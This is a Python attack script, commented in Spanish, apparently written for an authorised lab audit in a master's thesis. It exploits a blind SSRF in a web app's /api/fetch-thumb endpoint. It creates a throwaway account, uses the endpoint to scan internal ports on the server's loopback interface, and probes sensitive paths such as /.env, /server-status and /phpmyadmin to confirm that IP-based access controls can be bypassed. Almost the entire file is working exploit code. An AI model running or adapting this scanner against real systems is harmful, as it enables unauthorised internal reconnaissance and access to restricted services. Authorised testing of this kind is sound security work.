#!/usr/bin/env python3
"""
Escaner de puertos internos via SSRF ciego en /api/fetch-thumb de StreamWave
(BigShop / TFM). Ver Hallazgos/F-028 - SSRF en StreamWave (api/fetch-thumb).

Contexto:
  - /api/fetch-thumb recibe {"url": "..."} (requiere sesion autenticada) y
    hace, server-side, una peticion HTTP real a esa URL, devolviendo si fue
    "reachable", el status, el header Server y un content-type.
  - El servidor no restringe el host/puerto destino: acepta 127.0.0.1 y
    cualquier puerto -> SSRF clasico.
  - La respuesta diferencia 3 estados de forma fiable, lo que lo convierte
    en un oraculo de escaneo de puertos ciego:
      reachable:true                              -> puerto abierto, habla HTTP
      reachable:false, error contiene "Parse Error" -> puerto abierto, NO habla HTTP
      reachable:false, error contiene "ECONNREFUSED" -> puerto cerrado
  - Confirmado en la auditoria: esto permite ver que el puerto 3306 (MySQL,
    normalmente solo-loopback) esta abierto, y que /server-status (bloqueado
    con 403 si se pide desde fuera) responde 200 cuando se pide via este
    SSRF -> bypass real de un control de acceso por IP (Allow from localhost).

Que hace este script:
  1. Se registra una cuenta descartable (o reutiliza --cookie si se le pasa)
     para obtener una sesion valida, ya que el endpoint exige login.
  2. Barre un rango de puertos contra un host (por defecto 127.0.0.1, el
     propio contenedor) usando /api/fetch-thumb como oraculo, y clasifica
     cada puerto.
  3. Para cada puerto que resulta "abierto-HTTP", prueba ademas una lista
     corta de rutas sensibles conocidas (server-status, server-info, .env,
     actuator/health, ...) para detectar paneles/endpoints que deberian
     estar restringidos por IP y no lo estan desde dentro.

Uso:
    python3 streamwave_ssrf_portscan.py
    python3 streamwave_ssrf_portscan.py --host 127.0.0.1 --ports 1-10000
    python3 streamwave_ssrf_portscan.py --ports 80,3306,8080,9090,9999,10000
    python3 streamwave_ssrf_portscan.py --cookie "connect.sid=s%3A...."  # reutilizar sesion

Solo para uso en el laboratorio controlado BigShop (TFM), con autorizacion.
No usar contra sistemas sin autorizacion explicita.
"""

import argparse
import concurrent.futures
import http.cookiejar
import json
import random
import string
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request

DEFAULT_BASE_URL = "http://172.17.0.2:9090"
TIMEOUT = 6

# Rutas sensibles a probar en cada puerto HTTP descubierto, pensadas para
# detectar controles de acceso por IP ("solo localhost") que un SSRF puentea.
SENSITIVE_PATHS = [
    "/server-status",
    "/server-info",
    "/.env",
    "/actuator/health",
    "/admin",
    "/phpmyadmin",
    "/wp-json/wp/v2/users",
]

print_lock = threading.Lock()


def random_username():
    return "ssrf_scan_" + "".join(random.choices(string.ascii_lowercase + string.digits, k=8))


def login(base_url: str) -> http.cookiejar.CookieJar:
    """Registra una cuenta descartable y devuelve un cookiejar con sesion valida."""
    jar = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))

    username = random_username()
    data = (
        f"display_name=SSRF+Scanner&username={username}&password=TestPass123!"
    ).encode()
    req = urllib.request.Request(
        f"{base_url}/register", data=data,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        method="POST",
    )
    with opener.open(req, timeout=TIMEOUT) as resp:
        resp.read()

    if not any(c.name == "connect.sid" for c in jar):
        print("[!] No se obtuvo cookie de sesion tras el registro -- revisa el formulario.")
        sys.exit(1)

    print(f"[*] Sesion obtenida con cuenta descartable '{username}'.")
    return jar


def fetch_thumb(opener, base_url: str, target_url: str) -> dict:
    body = json.dumps({"url": target_url}).encode()
    req = urllib.request.Request(
        f"{base_url}/api/fetch-thumb", data=body,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        with opener.open(req, timeout=TIMEOUT) as resp:
            return json.loads(resp.read().decode("utf-8", errors="replace"))
    except urllib.error.HTTPError as e:
        try:
            return json.loads(e.read().decode("utf-8", errors="replace"))
        except Exception:
            return {"reachable": None, "error": f"HTTP {e.code}"}
    except Exception as e:
        return {"reachable": None, "error": f"local-error: {e}"}


def classify(result: dict) -> str:
    if result.get("reachable") is True:
        return "open-http"
    err = (result.get("error") or "")
    if "ECONNREFUSED" in err:
        return "closed"
    if "Parse Error" in err or "ECONNRESET" in err or "socket hang up" in err:
        return "open-nonhttp"
    if "ETIMEDOUT" in err or "timeout" in err.lower():
        return "filtered/timeout"
    return "unknown"


def parse_ports(spec: str):
    ports = set()
    for chunk in spec.split(","):
        chunk = chunk.strip()
        if "-" in chunk:
            lo, hi = chunk.split("-")
            ports.update(range(int(lo), int(hi) + 1))
        elif chunk:
            ports.add(int(chunk))
    return sorted(ports)


def scan_ports(opener, base_url: str, host: str, ports, threads: int):
    results = {}
    done = 0
    lock = threading.Lock()

    def worker(port):
        nonlocal done
        res = fetch_thumb(opener, base_url, f"http://{host}:{port}/")
        status = classify(res)
        with lock:
            done += 1
            if done % 200 == 0:
                print(f"[*] {done}/{len(ports)} puertos probados...")
        return port, status, res

    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as ex:
        for port, status, res in ex.map(worker, ports):
            results[port] = {"status": status, "raw": res}

    return results


def external_status(target_host: str, port: int, path: str):
    """Pide la misma ruta directamente desde fuera (sin pasar por el SSRF),
    para poder comparar y detectar un bypass real de control de acceso."""
    url = f"http://{target_host}:{port}{path}"
    req = urllib.request.Request(url, method="GET")
    try:
        with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
            return resp.status
    except urllib.error.HTTPError as e:
        return e.code
    except Exception:
        return None


def probe_sensitive_paths(opener, base_url: str, host: str, port: int, external_host: str):
    findings = []
    for path in SENSITIVE_PATHS:
        res = fetch_thumb(opener, base_url, f"http://{host}:{port}{path}")
        internal_status = res.get("status") if res.get("reachable") else None
        if internal_status is None or internal_status >= 400:
            continue

        ext_status = external_status(external_host, port, path)
        is_bypass = ext_status is not None and ext_status >= 400 > internal_status

        entry = {"path": path, "internal_status": internal_status,
                 "external_status": ext_status, "server": res.get("server"),
                 "acl_bypass": is_bypass}
        findings.append(entry)

        with print_lock:
            if is_bypass:
                print(f"    [!!!] {host}:{port}{path} -> interno={internal_status} "
                      f"vs externo={ext_status}  *** BYPASS DE CONTROL DE ACCESO POR IP ***")
            else:
                print(f"    [i]   {host}:{port}{path} -> interno={internal_status} "
                      f"externo={ext_status} (tambien accesible desde fuera, no es bypass)")
    return findings


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--base-url", default=DEFAULT_BASE_URL,
                     help="URL de StreamWave, donde vive /api/fetch-thumb")
    ap.add_argument("--host", default="127.0.0.1",
                     help="Host interno objetivo del escaneo (por defecto 127.0.0.1, el propio contenedor)")
    ap.add_argument("--ports", default="1-1024,3306,8080,9090,10000",
                     help="Rango/lista de puertos, ej. '1-1024,3306,8080'")
    ap.add_argument("--threads", type=int, default=20)
    ap.add_argument("--cookie", default=None,
                     help="Valor de 'connect.sid' ya autenticado, para no registrar una cuenta nueva")
    ap.add_argument("--external-host", default=None,
                     help="Host/IP externa real del objetivo (para comparar con la vista interna "
                          "via SSRF y detectar bypass de ACL por IP). Por defecto, el host de --base-url.")
    ap.add_argument("--out-json", default="streamwave_ssrf_portscan_results.json")
    args = ap.parse_args()

    if args.cookie:
        jar = http.cookiejar.CookieJar()
        c = http.cookiejar.Cookie(
            version=0, name="connect.sid", value=args.cookie,
            port=None, port_specified=False, domain="172.17.0.2", domain_specified=False,
            domain_initial_dot=False, path="/", path_specified=True, secure=False,
            expires=None, discard=True, comment=None, comment_url=None, rest={},
        )
        jar.set_cookie(c)
    else:
        jar = login(args.base_url)

    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))

    external_host = args.external_host or urllib.parse.urlparse(args.base_url).hostname
    ports = parse_ports(args.ports)
    print(f"[*] Escaneando {len(ports)} puertos en {args.host} via SSRF ciego "
          f"a traves de {args.base_url}/api/fetch-thumb ...")

    t0 = time.time()
    results = scan_ports(opener, args.base_url, args.host, ports, args.threads)
    elapsed = time.time() - t0

    open_http = sorted(p for p, r in results.items() if r["status"] == "open-http")
    open_nonhttp = sorted(p for p, r in results.items() if r["status"] == "open-nonhttp")
    closed = [p for p, r in results.items() if r["status"] == "closed"]
    other = sorted(p for p, r in results.items() if r["status"] not in
                    ("open-http", "open-nonhttp", "closed"))

    print()
    print("=" * 70)
    print(f"Puertos probados: {len(ports)}   (en {elapsed:.1f}s)")
    print(f"Abiertos HTTP:      {open_http}")
    for p in open_http:
        raw = results[p]["raw"]
        print(f"    {args.host}:{p}  status={raw.get('status')}  server={raw.get('server')}")
    print(f"Abiertos no-HTTP:   {open_nonhttp}  (puerto abierto, protocolo distinto -- ej. una BD)")
    print(f"Cerrados:           {len(closed)} puertos")
    if other:
        print(f"Otros/filtrados:    {other}")
    print("=" * 70)

    sensitive_findings = {}
    if open_http:
        print("\n[*] Probando rutas sensibles conocidas en cada puerto HTTP abierto...")
        for p in open_http:
            print(f"  -- puerto {p} --")
            findings = probe_sensitive_paths(opener, args.base_url, args.host, p, external_host)
            bypasses = [f for f in findings if f["acl_bypass"]]
            if bypasses:
                sensitive_findings[p] = bypasses

    output = {
        "target_host": args.host,
        "base_url": args.base_url,
        "ports_scanned": ports,
        "open_http": open_http,
        "open_nonhttp": open_nonhttp,
        "closed_count": len(closed),
        "results": {str(p): r["raw"] for p, r in results.items()},
        "sensitive_path_findings": sensitive_findings,
    }
    with open(args.out_json, "w", encoding="utf-8") as f:
        json.dump(output, f, indent=2, ensure_ascii=False)
    print(f"\n[+] Resultados completos -> {args.out_json}")

    if sensitive_findings:
        print("\n[!!!] Bypass de control de acceso por IP confirmado (interno accesible, externo bloqueado):")
        for p, findings in sensitive_findings.items():
            for f_ in findings:
                print(f"      {args.host}:{p}{f_['path']} -> interno={f_['internal_status']} "
                      f"vs externo={f_['external_status']}")


if __name__ == "__main__":
    main()
